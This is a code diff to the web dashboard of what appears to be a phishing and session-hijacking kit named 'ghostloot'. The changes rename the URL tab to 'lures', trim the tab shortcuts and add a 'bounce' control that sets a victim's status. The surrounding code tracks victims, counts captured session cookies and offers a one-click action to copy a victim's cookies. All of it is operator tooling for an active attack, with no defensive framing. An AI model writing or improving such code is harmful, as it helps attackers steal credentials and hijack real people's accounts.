   await fetch('/api/urls', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ url: u, label: l }) });
-  $('#nu').value = ''; $('#nl').value = ''; toast(t('url_added')); setTimeout(refreshUrlList, 400);
+  $('#nu').value = ''; $('#nl').value = ''; toast(t('url_added')); setTimeout(refreshLureTable, 400);
 }
 async function copyActive() {
   const act = (window._urls || []).filter(u => u.ok).map(u => u.url);
@@ -1201,7 +1280,7 @@ async function loadDomains() {
 async function fetchData(force) {
   try {
     loadDomains(); await loadHealth(); await loadVState();
-    if (state.tab === 'urls' && urlsInit) refreshUrlList();
+    if (state.tab === 'lures' && luresInit) refreshLureTable();
     const d = await (await fetch('/api/data')).json();
     $('#footdb').textContent = d.db + ' · ' + d.now;
     const sig = d.sessions.length + ':' + d.sessions.reduce((m, s) => Math.max(m, s.update || 0), 0) + ':' + d.sessions.reduce((a, s) => a + s.cookies, 0);
@@ -1252,6 +1331,8 @@ document.addEventListener('click', e => {
   if (sort) { const k = sort.dataset.sort; if (state.sort.key === k) state.sort.dir *= -1; else state.sort = { key: k, dir: -1 }; render(); return; }
   const stbtn = e.target.closest('[data-status]');
   if (stbtn) { setVictimStatus(stbtn.dataset.user, stbtn.dataset.status); return; }
+  const bbtn = e.target.closest('[data-bounce]');
+  if (bbtn) { setVictimStatus(bbtn.dataset.user, 'bounced', undefined, false, bbtn.dataset.bounce); return; }
   const copy = e.target.closest('[data-copy]');
   if (copy) { copyCookies(copy.dataset.copy); return; }
   const ctxt = e.target.closest('[data-copytext]');
@@ -1274,7 +1355,7 @@ document.addEventListener('click', e => {
   const curl = e.target.closest('[data-copyurl]');
   if (curl) { navigator.clipboard.writeText(curl.dataset.copyurl).then(() => toast(t('url_copied'))).catch(err => toast(t('error') + ': ' + err)); return; }
   const del = e.target.closest('[data-delurl]');
-  if (del) { if (!confirm(t('confirm_del'))) return; fetch('/api/urls?url=' + encodeURIComponent(del.dataset.delurl), { method: 'DELETE' }).then(refreshUrlList); return; }
+  if (del) { if (!confirm(t('confirm_del'))) return; fetch('/api/urls?url=' + encodeURIComponent(del.dataset.delurl), { method: 'DELETE' }).then(refreshLureTable); return; }
   const per = e.target.closest('[data-period]');
   if (per) { state.period = per.dataset.period; render(); return; }
   const reveal = e.target.closest('[data-reveal]');
@@ -1307,7 +1388,7 @@ $('#auto').onclick = () => {
 $('#langbtn').onclick = () => {
   LANG = LANG === 'en' ? 'es' : 'en';
   try { localStorage.setItem('ghostloot_lang', LANG); } catch (e) {}
-  setInit = false; urlsInit = false; applyStatic(); render(); loadHealth(); loadDomains();
+  setInit = false; luresInit = false; applyStatic(); render(); loadHealth(); loadDomains();
 };
 $('#help').addEventListener('click', e => { if (e.target.id === 'help') $('#help').hidden = true; });
 
@@ -1332,8 +1413,8 @@ document.addEventListener('keydown', e => {
   }
   if (e.key === 'j' || e.key === 'ArrowDown') { e.preventDefault(); moveSel(1); return; }
   if (e.key === 'k' || e.key === 'ArrowUp') { e.preventDefault(); moveSel(-1); return; }
-  if (e.key >= '1' && e.key <= '6') {
-    state.tab = ['dash', 'victims', 'sessions', 'lures', 'urls', 'settings'][+e.key - 1];
+  if (e.key >= '1' && e.key <= '4') {
+    state.tab = ['victims', 'sessions', 'lures', 'settings'][+e.key - 1];
     state.sel = null; render();
   }
 });
